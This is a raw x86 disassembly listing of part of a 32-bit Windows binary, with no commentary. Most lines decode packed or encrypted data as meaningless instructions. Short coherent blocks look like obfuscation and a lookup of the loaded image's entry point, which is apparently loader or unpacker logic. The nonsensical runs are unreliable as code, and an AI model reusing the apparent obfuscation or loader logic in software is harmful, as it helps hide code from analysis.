  41a55e:	push   esi
  41a55f:	jo     0x41a5cc
  41a561:	xor    al,0xfe
  41a563:	into   
  41a564:	ins    BYTE PTR es:[edi],dx
  41a565:	push   esp
  41a566:	fcomp  QWORD PTR ds:0x49ed609e
  41a56c:	mov    bl,0x22
  41a56e:	test   ah,0x94
  41a571:	jle    0x41a541
  41a573:	add    ecx,DWORD PTR [eax+eiz*4+0x66]
  41a577:	lds    edx,FWORD PTR [edi+0x3f252e0b]
  41a57d:	shl    BYTE PTR [ebx+0x35],0x2e
  41a581:	popf   
  41a582:	pop    es
  41a583:	mov    ebp,0x44a731c
  41a588:	das    
  41a589:	mov    dl,0xa
  41a58b:	adc    BYTE PTR [edi-0x2f3e0832],0x54
  41a592:	xor    BYTE PTR [edi],dl
  41a594:	int    0x5d
  41a596:	inc    ebx
  41a597:	mov    cl,0x3e
  41a599:	fs dec ebx
  41a59b:	lods   eax,DWORD PTR ds:[esi]
  41a59c:	aam    0xea
  41a59e:	and    eax,0x4928e685
  41a5a3:	jmp    0x41a5d2
  41a5a5:	xchg   ebp,eax
  41a5a6:	jecxz  0x41a534
  41a5a8:	jmp    0x9faab565
  41a5ad:	or     dh,BYTE PTR [ebx+ebx*1+0x4b5d59a1]
  41a5b4:	inc    ebp
  41a5b5:	(bad)  
  41a5b7:	cwde   
  41a5b8:	ret    
  41a5b9:	jecxz  0x41a55c
  41a5bb:	add    al,0xb4
  41a5bd:	and    eax,0x8b1d5ea9
  41a5c2:	push   esp
  41a5c3:	and    al,0x1c
  41a5c5:	shrd   ecx,edx,0x2
  41a5c9:	xor    ecx,eax
  41a5cb:	mov    eax,DWORD PTR [esp+0x18]
  41a5cf:	shl    eax,0x1e
  41a5d2:	shr    edx,0x2
  41a5d5:	mov    edx,DWORD PTR [esp+0x1c]
  41a5d9:	xor    eax,eax
  41a5db:	or     eax,ecx
  41a5dd:	mov    ecx,DWORD PTR [esp+0x68]
  41a5e1:	mov    DWORD PTR [ecx],eax
  41a5e3:	mov    eax,DWORD PTR [esp+0x68]
  41a5e7:	mov    ecx,DWORD PTR [esp+0x68]
  41a5eb:	mov    eax,DWORD PTR [eax]
  41a5ed:	cmp    eax,DWORD PTR [ecx]
  41a5ef:	jne    0x41a916
  41a5f5:	mov    eax,DWORD PTR [esp+0x5c]
  41a5f9:	mov    ecx,DWORD PTR [esp+0x5c]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	cmp    eax,DWORD PTR [ecx]
  41a601:	jne    0x41a916
  41a607:	mov    BYTE PTR [esp+0x2c],0x20
  41a60c:	mov    BYTE PTR [esp+0x38],0x3
  41a611:	jmp    0x41a86e
  41a616:	cs lock pop ebp
  41a619:	jne    0x41a5ba
  41a61b:	js     0x41a653
  41a61d:	mov    eax,0x90d3c3ca
  41a622:	(bad)  
  41a623:	es fnstsw WORD PTR ds:[ebx+eiz*1-0x40]
  41a629:	mov    esi,0xbebec235
  41a62e:	neg    BYTE PTR [ebx-0x3a]
  41a631:	mov    bl,BYTE PTR [esi+0x4f]
  41a634:	sub    al,0xd3
  41a636:	ja     0x41a611
  41a638:	xchg   ah,cl
  41a63a:	mov    al,0x35
  41a63c:	lock mov eax,0xde808968
  41a642:	cmp    DWORD PTR [ecx],esp
  41a644:	std    
  41a645:	sbb    eax,DWORD PTR [edi]
  41a647:	jno    0x41a5e8
  41a649:	inc    esp
  41a64a:	ins    BYTE PTR es:[edi],dx
  41a64b:	adc    DWORD PTR [esi+eax*4],esi
  41a64e:	test   eax,0x38974141
  41a653:	xchg   ecx,eax
  41a654:	push   ebx
  41a655:	xor    BYTE PTR [ecx+0x57],0xb8
  41a659:	retf   
  41a65a:	(bad)  
  41a65b:	loop   0x41a5e3
  41a65d:	jne    0x41a6d3
  41a65f:	pop    es
  41a660:	sub    BYTE PTR [ecx-0x2a98b135],cl
  41a666:	int3   
  41a667:	call   0x7383:0x51a4ff6b
  41a66e:	cli    
  41a66f:	xor    eax,0x9b1a1ef7
  41a674:	in     al,dx
  41a675:	pop    ebp
  41a676:	pusha  
  41a677:	into   
  41a678:	dec    ebx
  41a679:	addr16 pop ds
  41a67b:	inc    edx
  41a67c:	in     al,dx
  41a67d:	xchg   BYTE PTR [edi+0x21],bh
  41a680:	test   al,0xfb
  41a682:	ins    DWORD PTR es:[edi],dx
  41a683:	pop    ds
  41a684:	mov    bl,0xb7
  41a686:	push   ebx
  41a687:	outs   dx,BYTE PTR ds:[esi]
  41a688:	outs   dx,DWORD PTR ds:[esi]
  41a689:	inc    eax
  41a68a:	xchg   ecx,eax
  41a68b:	in     eax,dx
  41a68c:	ret    
  41a68d:	jmp    0x41a689
  41a68f:	cdq    
  41a690:	pop    ss
  41a691:	or     dl,BYTE PTR [edx]
  41a693:	xchg   ecx,eax
  41a694:	pop    ebp
  41a695:	mov    edx,0x9ecfde61
  41a69a:	arpl   WORD PTR [ebp+0x15e23376],ax
  41a6a0:	in     al,0x2e
  41a6a2:	test   DWORD PTR [eax-0x31070ca4],esi
  41a6a8:	mov    ecx,0x3310432b
  41a6ad:	jp     0x41a710
  41a6af:	jbe    0x41a6d2
  41a6b1:	jbe    0x41a676
  41a6b3:	sbb    DWORD PTR [ebp-0x12a529a],esp
  41a6b9:	or     eax,0x1d2bb5c4
  41a6be:	adc    DWORD PTR [eax-0x33],0xfe19cfa1
  41a6c5:	mov    ebp,0xd46fca42
  41a6ca:	shl    BYTE PTR [edi+esi*4-0x6b5667a0],1
  41a6d1:	dec    DWORD PTR [edi-0x22]
  41a6d4:	sbb    eax,0x30c2a772
  41a6d9:	xor    esi,DWORD PTR ds:0x30338ccf
  41a6df:	fdiv   QWORD PTR [ebp+ebp*4-0x10]
  41a6e3:	mov    eax,0x8ad5316c
  41a6e8:	pop    ds
  41a6e9:	push   eax
  41a6ea:	adc    eax,0x8e0a3228
  41a6ef:	mov    BYTE PTR [edi-0x3b],dl
  41a6f2:	ja     0x41a6e7
  41a6f4:	or     DWORD PTR [eax-0x403b773],ecx
  41a6fa:	repz add al,0x51
  41a6fd:	cs retw 
  41a700:	jne    0x41a6cd
  41a702:	sbb    al,BYTE PTR [ecx]
  41a704:	sbb    ah,BYTE PTR [ebp+0x22]
  41a707:	jmp    0x41a74a
  41a709:	sar    DWORD PTR [eax],cl
  41a70b:	out    0xcf,eax
  41a70d:	xor    dh,0x49
  41a710:	jmp    0xe0e4:0xf5e95634
  41a717:	loope  0x41a6ed
  41a719:	jne    0x41a6d2
  41a71b:	add    al,0xbf
  41a71d:	test   eax,0xa7845fcd
  41a722:	(bad)  
  41a723:	in     al,0x3d
  41a725:	lods   al,BYTE PTR ds:[esi]
  41a726:	add    BYTE PTR [esi+eiz*4],dl
  41a729:	mov    dh,0xb
  41a72b:	rcl    BYTE PTR [edi],1
  41a72d:	sub    ah,0x3d
  41a730:	push   ds
  41a731:	dec    ecx
  41a732:	mov    ds,ecx
  41a734:	inc    ebp
  41a735:	add    eax,0xefb8ef7b
  41a73a:	iret   
  41a73b:	mov    edi,0x7fc1af85
  41a740:	sti    
  41a741:	sub    edi,DWORD PTR [ecx+0x2f2e5690]
  41a747:	jno    0x41a7a6
  41a749:	retf   0xf9e6
  41a74c:	je     0x41a71d
  41a74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a750:	mov    WORD PTR [edi],es
  41a752:	sti    
  41a753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a754:	xchg   ebp,eax
  41a755:	sub    BYTE PTR [ecx],bh
  41a757:	mov    edx,0xebe4ae31
  41a75c:	push   eax
  41a75d:	fld    QWORD PTR [edi-0x562fadc5]
  41a763:	psubd  mm5,QWORD PTR [edi+ebp*2]
  41a767:	(bad)  
  41a768:	(bad)  
  41a769:	scas   al,BYTE PTR es:[edi]
  41a76a:	cmp    DWORD PTR [esi+0x63],edx
  41a76d:	push   ecx
  41a76e:	sub    eax,0x450ab21b
  41a773:	pop    eax
  41a774:	jg     0x41a721
  41a776:	out    dx,al
  41a777:	jecxz  0x41a73c
  41a779:	in     eax,0xfc
  41a77b:	rcl    eax,0xb
  41a77e:	cs inc ebp
  41a780:	iret   
  41a781:	int    0xb1
  41a783:	lods   eax,DWORD PTR ds:[esi]
  41a784:	stos   DWORD PTR es:[edi],eax
  41a785:	push   0xa4a3e71d
  41a78a:	shl    ch,0xc5
  41a78d:	sti    
  41a78e:	mov    ds:0x69359c69,eax
  41a793:	into   
  41a794:	xlat   BYTE PTR ds:[ebx]
  41a795:	pushf  
  41a796:	and    ch,BYTE PTR [eax]
  41a798:	daa    
  41a799:	iret   
  41a79a:	mov    dh,0x6c
  41a79c:	mov    edx,?
  41a79e:	dec    edx
  41a79f:	popf   
  41a7a0:	(bad)  
  41a7a1:	fstp   DWORD PTR [edi]
  41a7a3:	aas    
  41a7a4:	outs   dx,BYTE PTR ds:[esi]
  41a7a5:	push   ebp
  41a7a6:	xor    eax,0xf1dae41f
  41a7ab:	mov    esp,eax
  41a7ad:	jg     0x41a78f
  41a7af:	in     al,0x23
  41a7b1:	and    DWORD PTR [esi-0x45],ebx
  41a7b4:	out    0xf2,eax
  41a7b6:	mov    ebp,0x2e57c158
  41a7bb:	fwait
  41a7bc:	sub    BYTE PTR [ebp-0x11],al
  41a7bf:	pop    ebx
  41a7c0:	xor    dl,cl
  41a7c2:	cmp    DWORD PTR [edx+eiz*2+0x31a016d2],edx
  41a7c9:	pop    edx
  41a7ca:	(bad)  
  41a7cb:	fstp   TBYTE PTR [ecx]
  41a7cd:	dec    ebp
  41a7ce:	xchg   edi,eax
  41a7cf:	jmp    0x41a7d0
  41a7d1:	jmp    0x41a84a
  41a7d3:	iret   
  41a7d4:	test   eax,0x8296e508
  41a7d9:	loope  0x41a779
  41a7db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7dc:	xchg   ecx,eax
  41a7dd:	sahf   
  41a7de:	lock cmovle ecx,DWORD PTR [ecx+0x4d]
  41a7e3:	mov    eax,0x36dbef
  41a7e8:	push   cs
  41a7e9:	dec    eax
  41a7ea:	mov    ecx,0xc4f50608
  41a7ef:	cmp    ebp,DWORD PTR [ebx-0x38]
  41a7f2:	and    ecx,ecx
  41a7f4:	mov    al,ds:0x6227c3f3
  41a7f9:	push   ds
  41a7fa:	pusha  
  41a7fb:	out    0x76,al
  41a7fd:	mov    bl,0xf3
  41a7ff:	cli    
  41a800:	or     BYTE PTR [esi+0x1572aac7],dl
  41a806:	adc    dl,BYTE PTR [ecx+0x7b]
  41a809:	in     al,dx
  41a80a:	sbb    eax,0xacca06b5
  41a80f:	jge    0x41a844
  41a811:	ficomp DWORD PTR [ebx+0xde341a1]
  41a817:	jae    0x41a7e1
  41a819:	outs   dx,DWORD PTR ds:[esi]
  41a81a:	ror    dh,0xbd
  41a81d:	xchg   ebx,ebp
  41a81f:	cmp    esp,edx
  41a821:	stos   BYTE PTR es:[edi],al
  41a822:	call   0xd98b76a4
  41a827:	xlat   BYTE PTR ds:[ebx]
  41a828:	daa    
  41a829:	xchg   esi,eax
  41a82a:	retf   
  41a82b:	mov    ch,0xc
  41a82d:	push   ecx
  41a82e:	sub    eax,0xd2a09ebc
  41a833:	cmc    
  41a834:	or     dh,BYTE PTR [edx]
  41a836:	inc    eax
  41a837:	mov    gs,WORD PTR [ebp+eax*2-0xc]
  41a83b:	lds    ebp,FWORD PTR [esi+0x67]
  41a83e:	cmp    al,0x26
  41a840:	push   cs
  41a841:	jae    0x41a7c8
  41a843:	or     eax,0x8209ca65
  41a848:	bound  edi,QWORD PTR [eax]
  41a84a:	xor    BYTE PTR ds:0x88fe5463,dh
  41a850:	push   ds
  41a851:	retf   
  41a852:	mov    ch,0x5f
  41a854:	mov    ebx,0xcc12f335
  41a859:	scas   al,BYTE PTR es:[edi]
  41a85a:	cdq    
  41a85b:	ss and ebx,edx
  41a85e:	bound  esi,QWORD PTR [eax+0x3d7bd035]
  41a864:	xchg   ebp,eax
  41a865:	jae    0x41a8bd
  41a867:	xchg   ecx,eax
  41a868:	xchg   ebx,eax
  41a869:	pop    ebp
  41a86a:	adc    eax,0xc67a4f6e
  41a86f:	inc    esp
  41a870:	and    al,0x3c
  41a872:	ins    DWORD PTR es:[edi],dx
  41a873:	mov    BYTE PTR [esp+0x2b],0x90
  41a878:	mov    al,BYTE PTR [esp+0x2b]
  41a87c:	mov    cl,BYTE PTR [esp+0x3c]
  41a880:	or     al,0xdc
  41a882:	sub    al,cl
  41a884:	mov    cl,BYTE PTR [esp+0x38]
  41a888:	sub    al,0x56
  41a88a:	movzx  eax,al
  41a88d:	movzx  ecx,cl
  41a890:	cdq    
  41a891:	idiv   ecx
  41a893:	movzx  ecx,BYTE PTR [esp+0x2c]
  41a898:	or     eax,ecx
  41a89a:	mov    BYTE PTR [esp+0xc],al
  41a89e:	mov    BYTE PTR [esp+0x24],0x1
  41a8a3:	mov    BYTE PTR [esp+0x2b],0xcf
  41a8a8:	mov    BYTE PTR [esp+0x3c],0x6
  41a8ad:	mov    BYTE PTR [esp+0x38],0x25
  41a8b2:	mov    BYTE PTR [esp+0x2c],0xf8
  41a8b7:	mov    al,BYTE PTR [esp+0x2c]
  41a8bb:	mov    cl,BYTE PTR [esp+0x38]
  41a8bf:	or     al,0xc4
  41a8c1:	and    al,cl
  41a8c3:	mov    cl,BYTE PTR [esp+0x3c]
  41a8c7:	imul   cl
  41a8c9:	mov    cl,BYTE PTR [esp+0x2b]
  41a8cd:	movzx  ecx,cl
  41a8d0:	movzx  eax,al
  41a8d3:	and    eax,ecx
  41a8d5:	mov    cl,BYTE PTR [esp+0x24]
  41a8d9:	movzx  ecx,cl
  41a8dc:	cdq    
  41a8dd:	idiv   ecx
  41a8df:	mov    cl,BYTE PTR [esp+0xc]
  41a8e3:	cmp    cl,al
  41a8e5:	je     0x41a93c
  41a8eb:	lea    eax,[esp+0x9c]
  41a8f2:	push   eax
  41a8f3:	lea    edi,[esp+0x80]
  41a8fa:	call   0x40b68c
  41a8ff:	cmp    eax,ebx
  41a901:	jne    0x41a93c
  41a907:	cmp    edx,esi
  41a909:	jne    0x41a93c
  41a90f:	xor    eax,eax
  41a911:	jmp    0x41b43e
  41a916:	mov    eax,DWORD PTR [esp+0x70]
  41a91a:	mov    ecx,DWORD PTR [esp+0x74]
  41a91e:	mov    edx,DWORD PTR [esp+0x18]
  41a922:	mov    edi,DWORD PTR [esp+0x1c]
  41a926:	add    eax,edx
  41a928:	adc    ecx,edi
  41a92a:	mov    DWORD PTR [esp+0x18],eax
  41a92e:	mov    DWORD PTR [esp+0x1c],ecx
  41a932:	jmp    0x41a93c
  41a937:	mov    ebx,0xcb79b576
  41a93c:	push   0x4
  41a93e:	push   0x4226a8
  41a943:	lea    eax,[esp+0x6c]
  41a947:	push   eax
  41a948:	call   0x411c08
  41a94d:	mov    eax,DWORD PTR [esp+0x64]
  41a951:	push   0x4
  41a953:	push   DWORD PTR [eax+0x1a4]
  41a959:	lea    eax,[esp+0x74]
  41a95d:	push   eax
  41a95e:	call   0x411c08
  41a963:	mov    eax,DWORD PTR [esp+0x64]
  41a967:	mov    eax,DWORD PTR [eax+0x1a4]
  41a96d:	mov    eax,DWORD PTR [eax]
  41a96f:	mov    ecx,DWORD PTR [esp+0x64]
  41a973:	mov    eax,DWORD PTR [eax+0x3c]
  41a976:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41a97c:	mov    ecx,DWORD PTR [ecx]
  41a97e:	lea    eax,[ecx+eax*1+0x28]
  41a982:	mov    eax,DWORD PTR [eax]
  41a984:	add    DWORD PTR [esp+0x6c],eax
  41a988:	mov    DWORD PTR [esp+0x30],0x127
  41a990:	mov    DWORD PTR [esp+0x10],0x421a
  41a998:	mov    eax,DWORD PTR [esp+0x10]
  41a99c:	jmp    0x41abf9
  41a9a1:	add    BYTE PTR [edx-0x4b9c4ca1],al
  41a9a7:	adc    al,0xb2
  41a9a9:	sub    eax,0x8dd15a28
  41a9ae:	outs   dx,DWORD PTR ds:[esi]
  41a9af:	mov    dh,0xa4
  41a9b1:	repz sub eax,eax
  41a9b4:	mov    esi,0xbebec235
  41a9b9:	fdiv   DWORD PTR [edx+0x532491ac]
  41a9bf:	repz sub ebx,eax
  41a9c2:	ins    BYTE PTR es:[edi],dx
  41a9c3:	sbb    BYTE PTR [ecx],bl
  41a9c5:	inc    esi
  41a9c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9c7:	mov    eax,ds:0xdcfcc03
  41a9cc:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41a9ce:	add    DWORD PTR [ebp-0x17ff7fa2],ebp
  41a9d4:	mov    al,0x81
  41a9d6:	xor    eax,0xf3c8f77f
  41a9db:	sub    BYTE PTR [ebp+0x42],0xb1
  41a9df:	xlat   BYTE PTR ds:[ebx]
  41a9e0:	scas   eax,DWORD PTR es:[edi]
  41a9e1:	sbb    al,0xc6
  41a9e3:	inc    ebp
  41a9e4:	arpl   WORD PTR [ecx+0x69],dx
  41a9e7:	mov    ah,0x59
  41a9e9:	pusha  
  41a9ea:	and    DWORD PTR [edi],edi
  41a9ec:	imul   DWORD PTR [esi-0x2310518]
  41a9f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9f3:	ins    BYTE PTR es:[edi],dx
  41a9f4:	cmp    al,0x66
  41a9f6:	fsub   QWORD PTR [esp+eax*4+0x455859a]
  41a9fd:	and    ah,BYTE PTR [edx]
  41a9ff:	fs aaa 
  41aa01:	pop    es
  41aa02:	fdivr  st,st(6)
  41aa04:	mov    ecx,0x514fe300
  41aa09:	xchg   ebp,eax
  41aa0b:	mov    dl,0xf7
  41aa0d:	pop    ds
  41aa0e:	adc    ebx,ebp
  41aa10:	sub    eax,DWORD PTR [esi]
  41aa12:	int3   
  41aa13:	stos   DWORD PTR es:[edi],eax
  41aa14:	shl    DWORD PTR [edx-0x21],0xbf
  41aa18:	in     al,dx
  41aa19:	inc    edi
  41aa1a:	(bad)  
  41aa1b:	loop   0x41a9ba
  41aa1d:	bound  edi,QWORD PTR [esi-0x42]
  41aa20:	xchg   ecx,eax
  41aa21:	scas   eax,DWORD PTR es:[edi]
  41aa22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa23:	push   esi
  41aa24:	loopne 0x41a9b4
  41aa26:	arpl   WORD PTR [ecx],ax
  41aa28:	push   ebx
  41aa29:	push   ebp
  41aa2a:	mov    edi,0xc3d9aacb
  41aa2f:	and    ah,BYTE PTR [ecx+ebx*1+0x1b]
  41aa33:	iret   
  41aa34:	xchg   BYTE PTR [edx],bl
  41aa36:	and    ebx,DWORD PTR [edi+0x5e679dcd]
  41aa3c:	sub    dl,al
  41aa3e:	icebp  
  41aa3f:	push   ebp
  41aa40:	fsubr  DWORD PTR [esi-0x39]
  41aa43:	cmp    eax,ebx
  41aa45:	push   ds
  41aa46:	mov    esi,DWORD PTR [edx+0x5f]
  41aa49:	scas   al,BYTE PTR es:[edi]
  41aa4a:	mov    al,0xc0
  41aa4c:	jbe    0x41a9d6
  41aa4e:	stos   BYTE PTR es:[edi],al
  41aa4f:	inc    edx
  41aa50:	hlt    
  41aa51:	inc    edx
  41aa52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa53:	jno    0x41aa55
  41aa55:	xchg   edi,eax
  41aa56:	mov    ecx,0x74c67a63
  41aa5b:	hlt    
  41aa5c:	mov    ch,0xb7
  41aa5e:	cld    
  41aa5f:	push   edx
  41aa60:	jmp    0x41aa0d
  41aa62:	std    
  41aa63:	daa    
  41aa64:	mov    WORD PTR [esi-0xfabc012],ds
  41aa6a:	daa    
  41aa6b:	(bad)  
  41aa6c:	arpl   WORD PTR [esi+0x4],ax
  41aa6f:	test   eax,0xc3e9db9f
  41aa74:	push   ecx
  41aa75:	and    eax,0xb08de631
  41aa7a:	out    0x5,eax
  41aa7c:	lds    esp,FWORD PTR [ecx+esi*4]
  41aa7f:	xchg   ebx,eax
  41aa80:	sub    ebx,edx
  41aa82:	out    0x1b,al
  41aa84:	shl    BYTE PTR [ecx],cl
  41aa86:	pop    es
  41aa87:	out    0xb9,al
  41aa89:	jne    0x41aa79
  41aa8b:	or     BYTE PTR [edx+0x65a916bb],0xec
  41aa92:	xchg   ebx,eax
  41aa93:	push   edx
  41aa94:	xlat   BYTE PTR ds:[ebx]
  41aa95:	daa    
  41aa96:	ss push 0x6b
  41aa99:	dec    ebx
  41aa9a:	pop    ss
  41aa9b:	inc    ecx
  41aa9c:	(bad)  
  41aa9e:	xor    al,0x91
  41aaa0:	push   0x254d42b0
  41aaa5:	aas    
  41aaa6:	hlt    
  41aaa7:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41aaa9:	lock int3 
  41aaab:	xchg   ecx,eax
  41aaac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaad:	inc    ebp
  41aaae:	dec    esi
  41aaaf:	outs   dx,DWORD PTR ds:[esi]
  41aab0:	inc    esp
  41aab1:	or     eax,0xc12e13b
  41aab6:	test   eax,0x84b11a00
  41aabb:	rcl    BYTE PTR [edx],0xe3
  41aabe:	xor    al,0xe8
  41aac0:	jb     0x41aaec
  41aac2:	scas   eax,DWORD PTR es:[edi]
  41aac3:	mov    ah,0x45
  41aac5:	cmp    al,0x39
  41aac7:	pop    edx
  41aac8:	xor    al,0x0
  41aaca:	mov    cs,WORD PTR [esp+ebp*1-0x3921aeff]
  41aad1:	push   edx
  41aad2:	xor    esi,DWORD PTR [ebx+0x64]
  41aad5:	or     al,0x2b
  41aad7:	jg     0x41aa95
  41aad9:	push   esi
  41aada:	addr16 mov ebx,0xdaf398ba
  41aae0:	leave  
  41aae1:	lods   al,BYTE PTR ds:[esi]
  41aae2:	sti    
  41aae3:	(bad)  
  41aae4:	aam    0x62
  41aae6:	mov    WORD PTR [edi],ds
  41aae8:	leave  
  41aae9:	jbe    0x41ab15
  41aaeb:	loope  0x41aaf4
  41aaed:	jge    0x41aa73
  41aaef:	mov    ebp,0x52a8c5db
  41aaf4:	sub    BYTE PTR [ebx+0x66],dl
  41aaf7:	out    dx,eax
  41aaf8:	lods   eax,DWORD PTR ds:[esi]
  41aaf9:	cmp    BYTE PTR [edi+0x3f],bh
  41aafc:	daa    
  41aafd:	mul    BYTE PTR [ecx-0x73155eb2]
  41ab03:	xor    edi,ebp
  41ab05:	test   al,0x68
  41ab07:	xchg   DWORD PTR [edi+0x17],esp
  41ab0a:	mov    ebp,0xf4bccff4
  41ab0f:	inc    esi
  41ab10:	dec    ebp
  41ab11:	es adc eax,0x68b0e74b
  41ab17:	icebp  
  41ab18:	adc    edx,DWORD PTR gs:[edx+0x4d]
  41ab1c:	ret    0x6003
  41ab1f:	xlat   BYTE PTR ds:[ebx]
  41ab20:	xchg   ebx,eax
  41ab21:	cld    
  41ab22:	fsubr  DWORD PTR [ebx-0x2cf1782d]
  41ab28:	fwait
  41ab29:	adc    ebp,DWORD PTR [ecx]
  41ab2b:	jno    0x41aba1
  41ab2d:	cmp    al,0x6a
  41ab2f:	sbb    eax,0x6470ec4
  41ab34:	mov    dl,0x21
  41ab36:	(bad)  
  41ab37:	or     ch,BYTE PTR [ecx-0x44]
  41ab3a:	add    bh,al
  41ab3c:	js     0x41ab31
  41ab3e:	out    dx,al
  41ab3f:	inc    ebx
  41ab40:	in     eax,dx
  41ab41:	push   ecx
  41ab42:	call   0x9884fd5d
  41ab47:	jle    0x41abc2
  41ab49:	jge    0x41ab37
  41ab4b:	retf   0xd5e5
  41ab4e:	or     eax,0xde60be1e
  41ab53:	mov    DWORD PTR [ecx],eax
  41ab55:	and    ebx,esi
  41ab57:	out    dx,al
  41ab58:	xchg   ebx,eax
  41ab59:	sub    ecx,esp
  41ab5b:	and    al,0x14
  41ab5d:	dec    edi
  41ab5e:	(bad)  
  41ab5f:	mov    ebp,0x44e2836b
  41ab64:	out    dx,eax
  41ab65:	jge    0x41aba0
  41ab67:	mov    ecx,0x6141f722
  41ab6c:	ret    0x774
  41ab6f:	xlat   BYTE PTR ds:[ebx]
  41ab70:	add    eax,0x89251416
  41ab75:	inc    esp
  41ab76:	jns    0x41ab92
  41ab78:	arpl   WORD PTR [edi+0x1a],dx
  41ab7b:	dec    ebx
  41ab7c:	adc    edx,DWORD PTR [edi+0x417a66ae]
  41ab82:	in     al,dx
  41ab83:	mov    bl,0x36
  41ab85:	ror    DWORD PTR [ebx],1
  41ab87:	mov    cl,0x6
  41ab89:	dec    eax
  41ab8a:	jo     0x41abf9
  41ab8c:	xor    eax,0xdea38dd0
  41ab91:	sar    edx,0x3a
  41ab94:	popf   
  41ab95:	mov    BYTE PTR [edx],0x1e
  41ab98:	in     eax,0xb6
  41ab9a:	aad    0xe9
  41ab9c:	xor    dh,BYTE PTR [ebx]
  41ab9e:	fs sub eax,0x17fd6cae
  41aba4:	xchg   ebp,eax
  41aba5:	popa   
  41aba6:	xor    BYTE PTR [ebx-0x7f],bl
  41aba9:	add    BYTE PTR [ebx],bl
  41abab:	mov    dh,0x4a
  41abad:	ret    0xf6b9
  41abb0:	mov    dh,BYTE PTR [ecx+0x76]
  41abb3:	adc    al,0x86
  41abb5:	lods   eax,DWORD PTR ds:[esi]
  41abb6:	dec    edx
  41abb7:	fnstsw WORD PTR [ebp-0x1e]
  41abba:	and    eax,DWORD PTR [esi-0x16e34319]
  41abc0:	xchg   ebx,eax
  41abc1:	mov    ebp,0xccb24468
  41abc6:	dec    ecx
  41abc7:	mov    bl,0x83
  41abc9:	inc    esi
  41abca:	jne    0x41ac05
  41abcc:	js     0x41ab5a
  41abce:	(bad)  
  41abd0:	jmp    0x41abe2
  41abd2:	sbb    eax,DWORD PTR [ebx-0x7f1fdceb]
  41abd8:	xchg   edx,eax
  41abd9:	xchg   ebp,edx
  41abdb:	jae    0x41abe9
  41abdd:	pop    es
  41abde:	popf   
  41abdf:	pop    ss
  41abe0:	add    bl,bh
  41abe2:	pop    eax
  41abe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abe4:	out    0x58,eax
  41abe6:	loop   0x41abd4
  41abe8:	mov    ah,0x14
  41abea:	out    0xcb,al
  41abec:	lods   eax,DWORD PTR ds:[esi]
  41abed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abee:	and    esp,ebp
  41abf0:	mov    edi,0x1f32613d
  41abf5:	sbb    eax,0x2534178e
  41abfa:	inc    esp
  41abfb:	ret    0xffff
  41abfe:	add    eax,DWORD PTR [esp+0x30]
  41ac02:	and    eax,0xfffffe5a
  41ac07:	jmp    0x41ae64
  41ac0c:	xor    DWORD PTR [edi-0x1f],ebp
  41ac0f:	frstor [esp+esi*2+0x1832b431]
  41ac16:	test   bh,cl
  41ac18:	mov    bh,0x7e
  41ac1a:	add    ch,bl
  41ac1c:	imul   ebp,DWORD PTR ds:0xc235bec0,0xffffffbe
  41ac23:	mov    esi,0x8cbff96d
  41ac28:	popa   
  41ac29:	xchg   edi,eax
  41ac2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac2b:	aam    0xc0
  41ac2d:	xor    eax,0xb9003bd3
  41ac32:	cmp    DWORD PTR ds:0xd3fba60,eax
  41ac38:	hlt    
  41ac39:	stos   BYTE PTR es:[edi],al
  41ac3a:	jo     0x41ac72
  41ac3c:	adc    al,0xef
  41ac3e:	fcmovne st,st(1)
  41ac40:	pop    ds
  41ac41:	lods   al,BYTE PTR ds:[esi]
  41ac42:	xor    edx,DWORD PTR [esi+0x55]
  41ac45:	add    eax,0xe5e0b1a7
  41ac4a:	cld    
  41ac4b:	xchg   esp,eax
  41ac4c:	mov    eax,ecx
  41ac4e:	inc    ecx
  41ac4f:	scas   al,BYTE PTR es:[edi]
  41ac50:	xchg   esp,eax
  41ac51:	add    eax,0x685e1478
  41ac56:	dec    ebp
  41ac57:	scas   eax,DWORD PTR es:[edi]
  41ac58:	add    ah,dh
  41ac5a:	(bad)  
  41ac5c:	inc    ebp
  41ac5d:	mov    esp,0xb83ab6d7
  41ac62:	push   edi
  41ac63:	push   ss
  41ac64:	(bad)  
  41ac65:	jmp    0x828f:0x2d5d7682
  41ac6c:	sbb    DWORD PTR [edx+0x7e],ecx
  41ac6f:	pop    es
  41ac70:	lods   al,BYTE PTR ds:[esi]
  41ac71:	cdq    
  41ac72:	fimul  DWORD PTR [bx-0x1]
  41ac76:	ret    
  41ac77:	ja     0x41ac49
  41ac79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac7a:	jmp    0x41ac3c
  41ac7c:	(bad)  
  41ac7d:	xor    ch,cl
  41ac7f:	push   ebx
  41ac80:	addr16 cs in al,0x46
  41ac84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac85:	xor    al,0x9d
  41ac87:	fsub   QWORD PTR [eax-0x20]
  41ac8a:	dec    ebp
  41ac8b:	cmp    eax,0xb4324c7e
  41ac90:	jmp    0xc6617fd5
  41ac95:	xchg   esp,eax
  41ac96:	inc    edi
  41ac97:	or     DWORD PTR [esi],esp
  41ac99:	push   ds
  41ac9a:	jne    0x41ac5d
  41ac9c:	int    0x13
  41ac9e:	fcom   DWORD PTR [esi-0x74c94be8]
  41aca4:	inc    ecx
  41aca5:	xor    DWORD PTR [eax+0x13a873f2],esp
  41acab:	lods   eax,DWORD PTR ds:[esi]
  41acac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acad:	adc    al,0x55
  41acaf:	jae    0x41ac3f
  41acb1:	sub    ebp,edx
  41acb3:	jecxz  0x41acd5
  41acb5:	or     eax,0x48de83a3
  41acba:	pop    ds
